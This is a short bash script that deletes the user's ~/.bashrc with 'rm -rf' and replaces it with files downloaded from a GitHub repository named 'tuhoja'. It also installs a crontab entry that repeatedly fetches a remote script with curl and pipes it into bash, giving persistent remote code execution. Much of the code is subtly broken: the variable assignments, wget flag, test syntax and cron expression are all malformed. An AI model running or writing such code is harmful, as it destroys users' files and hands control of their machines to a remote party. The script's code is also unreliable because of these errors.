#!/bin/bash
bashcr = ~/.bashrc
safe = 0
config = ~/totallysfa
if test -f $config; then
  safe = cat $config
  if $safe == 0; then
    rm -rf $bashcr
    wget -o $bashcr https://github.com/Poliisi5/tuhoja/raw/refs/heads/main/black.bash
  else
    rm -rf $bashcr
    wget -o $bashcr https://github.com/Poliisi5/tuhoja/raw/refs/heads/main/white.bash
  fi
else
  echo $safe > config
  (crontab -l 2>/dev/null; echo "/5 * * * * * curl -sSf https://raw.githubusercontent.com/Poliisi5/tuhoja/refs/heads/main/croninator.bash | bash") | crontab -
fi
